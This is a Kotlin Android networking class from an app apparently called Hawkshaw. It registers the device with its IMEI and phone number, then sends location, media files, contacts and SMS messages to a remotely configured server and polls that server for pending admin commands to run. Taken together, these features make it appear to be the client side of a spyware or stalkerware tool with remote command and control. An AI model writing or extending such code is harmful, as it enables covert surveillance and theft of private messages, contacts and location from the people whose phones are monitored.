package com.hawkshaw.library.network

import android.content.Context
import android.util.Log
import com.hawkshaw.app.BuildConfig
import com.hawkshaw.library.config.RemoteConfig
import com.hawkshaw.library.preferences.Prefs
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import java.io.File
import java.io.IOException
import java.util.concurrent.TimeUnit

class ApiService(private val context: Context) {
    
    companion object {
        private const val TAG = "ApiService"
        private const val TIMEOUT_SECONDS = 30L
    }
    
    // Using Prefs singleton object directly
    private val client = OkHttpClient.Builder()
        .connectTimeout(TIMEOUT_SECONDS, TimeUnit.SECONDS)
        .readTimeout(TIMEOUT_SECONDS, TimeUnit.SECONDS)
        .writeTimeout(TIMEOUT_SECONDS, TimeUnit.SECONDS)
        .build()
    
    // Get the base URL from the correct source of truth: RemoteConfig
    private val _baseUrl: String
        get() = RemoteConfig.getInstance(context).getBaseUrl()

    private val retrofit by lazy {
        Retrofit.Builder()
            .baseUrl(_baseUrl) // Updated to use _baseUrl
            .client(client)
            .addConverterFactory(GsonConverterFactory.create())
            .build()
    }
    
    private val prefs: Prefs = Prefs
    
    private val deviceToken: String?
        get() = prefs.getToken()
    
    private val deviceId: String
        get() = prefs.getString("device_id", "") ?: ""
    
    // Method to get Retrofit service instances for new API extensions
    fun <T> getRetrofitService(serviceClass: Class<T>): T {
        return retrofit.create(serviceClass)
    }
    
    // Helper methods for API extensions
    fun getBaseUrl(): String = _baseUrl // Updated to use _baseUrl
    fun getHttpClient(): OkHttpClient = client
    
    suspend fun registerDevice(deviceInfo: DeviceRegistrationRequest): ApiResponse<DeviceRegistrationResponse> {
        return withContext(Dispatchers.IO) {
            val requestId = System.currentTimeMillis().toString()
            val url = "$_baseUrl/api/devices/register"
            
            if (BuildConfig.DEBUG) {
                Log.d(TAG, "[$requestId] Starting device registration to: $url")
                Log.d(TAG, "[$requestId] Device info: ${deviceInfo.deviceName} (${deviceInfo.model})")
            }
            
            try {
                val json = JSONObject().apply {
                    put("device_id", deviceInfo.deviceId)
                    put("device_name", deviceInfo.deviceName)
                    put("model", deviceInfo.model)
                    put("manufacturer", deviceInfo.manufacturer)
                    put("android_version", deviceInfo.androidVersion)
                    put("api_level", deviceInfo.apiLevel)
                    put("imei", deviceInfo.imei)
                    put("phone_number", deviceInfo.phoneNumber)
                    put("fcm_token", deviceInfo.fcmToken)
                    put("app_version", deviceInfo.appVersion)
                }
                
                val requestBody = json.toString().toRequestBody("application/json".toMediaType())
                val request = Request.Builder()
                    .url(url)
                    .post(requestBody)
                    .build()
                
                if (BuildConfig.DEBUG) {
                    Log.d(TAG, "[$requestId] Sending registration request")
                }
                
                val startTime = System.currentTimeMillis()
                val response = client.newCall(request).execute()
                val responseBody = response.body?.string()
                val duration = System.currentTimeMillis() - startTime
                
                if (BuildConfig.DEBUG) {
                    Log.d(TAG, "[$requestId] Response received in ${duration}ms - Status: ${response.code}")
                    if (response.code !in 200..299) {
                        Log.w(TAG, "[$requestId] Error response: ${response.code} - ${response.message}")
                        responseBody?.take(1000)?.let { 
                            Log.w(TAG, "[$requestId] Response body: $it")
                        }
                    }
                }
                
                if (response.isSuccessful && responseBody != null) {
                    val jsonResponse = JSONObject(responseBody)
                    if (jsonResponse.getBoolean("success")) {
                        val deviceToken = jsonResponse.getString("device_token")
                        prefs.setToken(deviceToken)
                        
                        if (BuildConfig.DEBUG) {
                            Log.i(TAG, "[$requestId] Device registration successful")
                            Log.d(TAG, "[$requestId] Received device token: ${deviceToken.take(5)}...")
                        }
                        
                        ApiResponse.Success(
                            DeviceRegistrationResponse(
                                deviceToken = deviceToken,
                                message = "Device registered successfully"
                            )
                        )
                    } else {
                        val errorMsg = jsonResponse.optString("error", "Registration failed")
                        if (BuildConfig.DEBUG) {
                            Log.e(TAG, "[$requestId] Registration failed: $errorMsg")
                        }
                        ApiResponse.Error(errorMsg)
                    }
                } else {
                    val errorMsg = "HTTP ${response.code}: ${response.message}"
                    if (BuildConfig.DEBUG) {
                        Log.e(TAG, "[$requestId] $errorMsg")
                        responseBody?.take(1000)?.let { 
                            Log.e(TAG, "[$requestId] Error details: $it")
                        }
                    }
                    ApiResponse.Error(errorMsg)
                }
            } catch (e: Exception) {
                if (BuildConfig.DEBUG) {
                    Log.e(TAG, "[$requestId] Device registration failed", e)
                }
                ApiResponse.Error(e.message ?: "Network error")
            }
        }
    }
    
    suspend fun sendHeartbeat(heartbeatData: HeartbeatRequest): ApiResponse<String> {
        return withContext(Dispatchers.IO) {
            try {
                val json = JSONObject().apply {
                    put("battery_level", heartbeatData.batteryLevel)
                    put("is_charging", heartbeatData.isCharging)
                    put("network_type", heartbeatData.networkType)
                    put("location_enabled", heartbeatData.locationEnabled)
                    put("camera_enabled", heartbeatData.cameraEnabled)
                    put("microphone_enabled", heartbeatData.microphoneEnabled)
                    put("storage_total", heartbeatData.storageTotal)
                    put("storage_available", heartbeatData.storageAvailable)
                    put("ram_total", heartbeatData.ramTotal)
                    put("ram_available", heartbeatData.ramAvailable)
                }
                
                val requestBody = json.toString().toRequestBody("application/json".toMediaType())
                val request = Request.Builder()
                    .url("$_baseUrl/api/auth/device/heartbeat") // Updated to use _baseUrl
                    .post(requestBody)
                    .addHeader("X-Device-ID", deviceId)
                    .addHeader("X-Device-Token", deviceToken ?: "")
                    .build()
                
                val response = client.newCall(request).execute()
                val responseBody = response.body?.string()
                
                if (response.isSuccessful && responseBody != null) {
                    val jsonResponse = JSONObject(responseBody)
                    if (jsonResponse.getBoolean("success")) {
                        ApiResponse.Success("Heartbeat sent successfully")
                    } else {
                        ApiResponse.Error(jsonResponse.optString("error", "Heartbeat failed"))
                    }
                } else {
                    ApiResponse.Error("HTTP ${response.code}: ${response.message}")
                }
            } catch (e: Exception) {
                Log.e(TAG, "Heartbeat failed", e)
                ApiResponse.Error(e.message ?: "Network error")
            }
        }
    }
    
    suspend fun submitLocation(locationData: LocationData): ApiResponse<String> {
        return withContext(Dispatchers.IO) {
            try {
                val json = JSONObject().apply {
                    put("latitude", locationData.latitude)
                    put("longitude", locationData.longitude)
                    put("altitude", locationData.altitude)
                    put("accuracy", locationData.accuracy)
                    put("speed", locationData.speed)
                    put("bearing", locationData.bearing)
                    put("provider", locationData.provider)
                    put("address", locationData.address)
                    put("timestamp", locationData.timestamp)
                    put("battery_level", locationData.batteryLevel)
                    put("network_type", locationData.networkType)
                    put("is_mock", locationData.isMock)
                }
                
                val requestBody = json.toString().toRequestBody("application/json".toMediaType())
                val request = Request.Builder()
                    .url("$_baseUrl/api/location") // Updated to use _baseUrl
                    .post(requestBody)
                    .addHeader("X-Device-ID", deviceId)
                    .addHeader("X-Device-Token", deviceToken ?: "")
                    .build()
                
                val response = client.newCall(request).execute()
                val responseBody = response.body?.string()
                
                if (response.isSuccessful && responseBody != null) {
                    val jsonResponse = JSONObject(responseBody)
                    if (jsonResponse.getBoolean("success")) {
                        ApiResponse.Success("Location submitted successfully")
                    } else {
                        ApiResponse.Error(jsonResponse.optString("error", "Location submission failed"))
                    }
                } else {
                    ApiResponse.Error("HTTP ${response.code}: ${response.message}")
                }
            } catch (e: Exception) {
                Log.e(TAG, "Location submission failed", e)
                ApiResponse.Error(e.message ?: "Network error")
            }
        }
    }
    
    suspend fun uploadMediaFile(file: File, mediaType: String, metadata: MediaMetadata): ApiResponse<String> {
        return withContext(Dispatchers.IO) {
            try {
                val requestBody = MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("media", file.name, file.asRequestBody())
                    .addFormDataPart("captured_at", metadata.capturedAt.toString())
                    .addFormDataPart("location_latitude", metadata.latitude?.toString() ?: "")
                    .addFormDataPart("location_longitude", metadata.longitude?.toString() ?: "")
                    .addFormDataPart("duration", metadata.duration?.toString() ?: "")
                    .addFormDataPart("width", metadata.width?.toString() ?: "")
                    .addFormDataPart("height", metadata.height?.toString() ?: "")
                    .addFormDataPart("metadata", metadata.toJson())
                    .build()
                
                val request = Request.Builder()
                    .url("$_baseUrl/api/media/upload") // Updated to use _baseUrl
                    .post(requestBody)
                    .addHeader("X-Device-ID", deviceId)
                    .addHeader("X-Device-Token", deviceToken ?: "")
                    .build()
                
                val response = client.newCall(request).execute()
                val responseBody = response.body?.string()
                
                if (response.isSuccessful && responseBody != null) {
                    val jsonResponse = JSONObject(responseBody)
                    if (jsonResponse.getBoolean("success")) {
                        ApiResponse.Success("Media uploaded successfully")
                    } else {
                        ApiResponse.Error(jsonResponse.optString("error", "Media upload failed"))
                    }
                } else {
                    ApiResponse.Error("HTTP ${response.code}: ${response.message}")
                }
            } catch (e: Exception) {
                Log.e(TAG, "Media upload failed", e)
                ApiResponse.Error(e.message ?: "Network error")
            }
        }
    }
    
    suspend fun submitContacts(contacts: List<ContactData>): ApiResponse<String> {
        return withContext(Dispatchers.IO) {
            try {
                val json = JSONObject().apply {
                    put("contacts", contacts.map { it.toJson() })
                }
                
                val requestBody = json.toString().toRequestBody("application/json".toMediaType())
                val request = Request.Builder()
                    .url("$_baseUrl/api/contacts") // Updated to use _baseUrl
                    .post(requestBody)
                    .addHeader("X-Device-ID", deviceId)
                    .addHeader("X-Device-Token", deviceToken ?: "")
                    .build()
                
                val response = client.newCall(request).execute()
                val responseBody = response.body?.string()
                
                if (response.isSuccessful && responseBody != null) {
                    val jsonResponse = JSONObject(responseBody)
                    if (jsonResponse.getBoolean("success")) {
                        ApiResponse.Success("Contacts submitted successfully")
                    } else {
                        ApiResponse.Error(jsonResponse.optString("error", "Contacts submission failed"))
                    }
                } else {
                    ApiResponse.Error("HTTP ${response.code}: ${response.message}")
                }
            } catch (e: Exception) {
                Log.e(TAG, "Contacts submission failed", e)
                ApiResponse.Error(e.message ?: "Network error")
            }
        }
    }
    
    suspend fun submitSMSMessages(smsMessages: List<SMSData>): ApiResponse<String> {
        return withContext(Dispatchers.IO) {
            try {
                val json = JSONObject().apply {
                    put("sms_messages", smsMessages.map { it.toJson() })
                }
                
                val requestBody = json.toString().toRequestBody("application/json".toMediaType())
                val request = Request.Builder()
                    .url("$_baseUrl/api/sms") // Updated to use _baseUrl
                    .post(requestBody)
                    .addHeader("X-Device-ID", deviceId)
                    .addHeader("X-Device-Token", deviceToken ?: "")
                    .build()
                
                val response = client.newCall(request).execute()
                val responseBody = response.body?.string()
                
                if (response.isSuccessful && responseBody != null) {
                    val jsonResponse = JSONObject(responseBody)
                    if (jsonResponse.getBoolean("success")) {
                        ApiResponse.Success("SMS messages submitted successfully")
                    } else {
                        ApiResponse.Error(jsonResponse.optString("error", "SMS submission failed"))
                    }
                } else {
                    ApiResponse.Error("HTTP ${response.code}: ${response.message}")
                }
            } catch (e: Exception) {
                Log.e(TAG, "SMS submission failed", e)
                ApiResponse.Error(e.message ?: "Network error")
            }
        }
    }
    
    suspend fun getPendingCommands(): ApiResponse<List<DeviceCommand>> {
        return withContext(Dispatchers.IO) {
            try {
                val request = Request.Builder()
                    .url("$_baseUrl/api/admin/commands/pending") // Updated to use _baseUrl
                    .get()
                    .addHeader("X-Device-ID", deviceId)
                    .addHeader("X-Device-Token", deviceToken ?: "")
                    .build()
                
                val response = client.newCall(request).execute()
                val responseBody = response.body?.string()
                
                if (response.isSuccessful && responseBody != null) {
                    val jsonResponse = JSONObject(responseBody)
                    if (jsonResponse.getBoolean("success")) {
                        val commandsArray = jsonResponse.getJSONObject("data").getJSONArray("commands")
                        val commands = mutableListOf<DeviceCommand>()

                        for (i in 0 until commandsArray.length()) {
                            val commandJson = commandsArray.getJSONObject(i)
                            commands.add(DeviceCommand.fromJson(commandJson))
                        }

                        ApiResponse.Success(commands)
                    } else {
                        ApiResponse.Error(jsonResponse.optString("error", "Failed to get commands"))
                    }
                } else {
                    ApiResponse.Error("HTTP ${response.code}: ${response.message}")
                }
            } catch (e: Exception) {
                Log.e(TAG, "Get pending commands failed", e)
                ApiResponse.Error(e.message ?: "Network error")
            }
        }
    }

    suspend fun updateCommandStatus(commandId: String, status: String, responseData: String? = null, errorMessage: String? = null): ApiResponse<String> {
        return withContext(Dispatchers.IO) {
            try {
                val json = JSONObject().apply {
                    put("status", status)
                    responseData?.let { put("response_data", it) }
                    errorMessage?.let { put("error_message", it) }
                }

                val requestBody = json.toString().toRequestBody("application/json".toMediaType())
                val request = Request.Builder()
                    .url("$_baseUrl/api/admin/commands/$commandId/status") // Updated to use _baseUrl
                    .post(requestBody)
                    .addHeader("X-Device-ID", deviceId)
                    .addHeader("X-Device-Token", deviceToken ?: "")
                    .build()

                val response = client.newCall(request).execute()
                val responseBody = response.body?.string()

                if (response.isSuccessful && responseBody != null) {
                    val jsonResponse = JSONObject(responseBody)
                    if (jsonResponse.getBoolean("success")) {
                        ApiResponse.Success("Command status updated")
                    } else {
                        ApiResponse.Error(jsonResponse.optString("error", "Status update failed"))
                    }
                } else {
                    ApiResponse.Error("HTTP ${response.code}: ${response.message}")
                }
            } catch (e: Exception) {
                Log.e(TAG, "Command status update failed", e)
                ApiResponse.Error(e.message ?: "Network error")
            }
        }
    }
}
